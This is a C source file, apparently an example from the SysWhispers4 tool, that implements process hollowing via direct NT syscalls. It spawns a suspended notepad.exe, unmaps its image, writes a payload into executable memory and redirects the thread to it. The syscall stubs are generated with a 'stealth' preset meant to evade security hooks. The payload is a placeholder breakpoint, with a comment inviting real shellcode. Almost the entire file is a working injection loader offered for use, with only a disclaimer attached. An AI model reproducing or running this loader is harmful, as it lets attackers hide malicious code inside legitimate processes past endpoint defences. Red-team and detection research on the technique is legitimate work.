/*
 * SysWhispers4 — Example: Process Hollowing via NT syscalls
 *
 * FOR AUTHORIZED SECURITY TESTING AND RESEARCH ONLY.
 * Unauthorized use against systems you do not own is illegal.
 *
 * Technique:
 *   1. Create a suspended legitimate process (e.g., svchost.exe)
 *   2. Unmap its original image from memory
 *   3. Allocate new memory in the hollowed process
 *   4. Write payload into the allocated region
 *   5. Set thread context (RIP/EIP) to payload entry point
 *   6. Resume the thread to execute payload
 *
 * Generated with:
 *   python syswhispers.py --preset stealth --method indirect --resolve freshycalls
 *
 * Compile (MSVC):
 *   cl /nologo /W3 example_process_hollowing.c SW4Syscalls.c SW4Syscalls.asm
 *
 * Compile (MinGW):
 *   x86_64-w64-mingw32-gcc -masm=intel example_process_hollowing.c SW4Syscalls.c SW4Syscalls_stubs.c -o hollowing.exe
 */
#include <stdio.h>
#include <string.h>
#include "SW4Syscalls.h"

/* Placeholder payload — replace with real shellcode for testing */
static const unsigned char payload[] = {
    0xCC, /* int3 — breakpoint for testing */
};

int main(void) {
    NTSTATUS status;
    HANDLE hProcess = NULL;
    HANDLE hThread  = NULL;

    /* Step 0: Initialize SysWhispers4 runtime (resolve SSNs) */
    if (!SW4_Initialize()) {
        fprintf(stderr, "[!] SW4_Initialize failed\n");
        return 1;
    }
    printf("[+] SysWhispers4 initialized\n");

    /*
     * Step 1: Create a suspended process
     *
     * In a real scenario you would use NtCreateUserProcess to spawn a
     * legitimate Windows binary (e.g., svchost.exe) in a suspended state.
     * NtCreateUserProcess is the modern syscall (Vista+) that replaces
     * the older NtCreateProcess + NtCreateThread pair.
     *
     * For this example we use CreateProcessW from kernel32 to create
     * the suspended host, then operate on it with NT syscalls.
     */
    STARTUPINFOW si;
    PROCESS_INFORMATION pi;
    memset(&si, 0, sizeof(si));
    si.cb = sizeof(si);
    memset(&pi, 0, sizeof(pi));

    wchar_t targetExe[] = L"C:\\Windows\\System32\\notepad.exe";

    if (!CreateProcessW(
            targetExe, NULL, NULL, NULL, FALSE,
            CREATE_SUSPENDED, NULL, NULL, &si, &pi)) {
        fprintf(stderr, "[!] CreateProcessW failed: %lu\n", GetLastError());
        return 1;
    }
    hProcess = pi.hProcess;
    hThread  = pi.hThread;
    printf("[+] Created suspended process PID=%lu TID=%lu\n",
           pi.dwProcessId, pi.dwThreadId);

    /* Step 2: Query the process to find its image base address */
    PROCESS_BASIC_INFORMATION pbi;
    memset(&pbi, 0, sizeof(pbi));
    status = SW4_NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pbi,
        sizeof(pbi),
        NULL
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtQueryInformationProcess failed: 0x%08X\n", status);
        goto cleanup;
    }
    printf("[+] PEB address: 0x%p\n", pbi.PebBaseAddress);

    /*
     * Read ImageBaseAddress from PEB.
     * PEB->ImageBaseAddress is at offset 0x10 on x64.
     */
    PVOID imageBase = NULL;
    SIZE_T bytesRead = 0;
    status = SW4_NtReadVirtualMemory(
        hProcess,
        (PBYTE)pbi.PebBaseAddress + 0x10,
        &imageBase,
        sizeof(imageBase),
        &bytesRead
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtReadVirtualMemory (PEB) failed: 0x%08X\n", status);
        goto cleanup;
    }
    printf("[+] Image base: 0x%p\n", imageBase);

    /* Step 3: Unmap the original image from the target process */
    status = SW4_NtUnmapViewOfSection(hProcess, imageBase);
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtUnmapViewOfSection failed: 0x%08X\n", status);
        goto cleanup;
    }
    printf("[+] Original image unmapped at 0x%p\n", imageBase);

    /* Step 4: Allocate memory at the original image base */
    PVOID  allocBase  = imageBase;
    SIZE_T allocSize  = 0x10000; /* 64 KB — adjust to payload size */
    status = SW4_NtAllocateVirtualMemory(
        hProcess,
        &allocBase,
        0,
        &allocSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtAllocateVirtualMemory failed: 0x%08X\n", status);
        goto cleanup;
    }
    printf("[+] Allocated 0x%llX bytes at 0x%p\n",
           (unsigned long long)allocSize, allocBase);

    /* Step 5: Write payload into the allocated region */
    SIZE_T written = 0;
    status = SW4_NtWriteVirtualMemory(
        hProcess,
        allocBase,
        (PVOID)payload,
        sizeof(payload),
        &written
    );
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtWriteVirtualMemory failed: 0x%08X\n", status);
        goto cleanup;
    }
    printf("[+] Wrote %llu bytes of payload\n", (unsigned long long)written);

    /* Step 6: Update thread context to point to our payload */
    CONTEXT ctx;
    memset(&ctx, 0, sizeof(ctx));
    ctx.ContextFlags = CONTEXT_FULL;
    status = SW4_NtGetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtGetContextThread failed: 0x%08X\n", status);
        goto cleanup;
    }
    printf("[+] Original RIP: 0x%llX\n", (unsigned long long)ctx.Rip);

#ifdef _M_X64
    ctx.Rip = (DWORD64)(ULONG_PTR)allocBase;
#else
    ctx.Eip = (DWORD)(ULONG_PTR)allocBase;
#endif

    status = SW4_NtSetContextThread(hThread, &ctx);
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtSetContextThread failed: 0x%08X\n", status);
        goto cleanup;
    }
    printf("[+] Thread context updated — entry point set to 0x%p\n", allocBase);

    /* Step 7: Resume the thread to execute the payload */
    ULONG suspendCount = 0;
    status = SW4_NtResumeThread(hThread, &suspendCount);
    if (!NT_SUCCESS(status)) {
        fprintf(stderr, "[!] NtResumeThread failed: 0x%08X\n", status);
        goto cleanup;
    }
    printf("[+] Thread resumed (previous suspend count: %lu)\n", suspendCount);
    printf("[+] Process hollowing complete.\n");

    /* Wait for the hollowed process */
    SW4_NtWaitForSingleObject(hProcess, FALSE, NULL);

cleanup:
    if (hThread)  SW4_NtClose(hThread);
    if (hProcess) SW4_NtClose(hProcess);
    return NT_SUCCESS(status) ? 0 : 1;
}
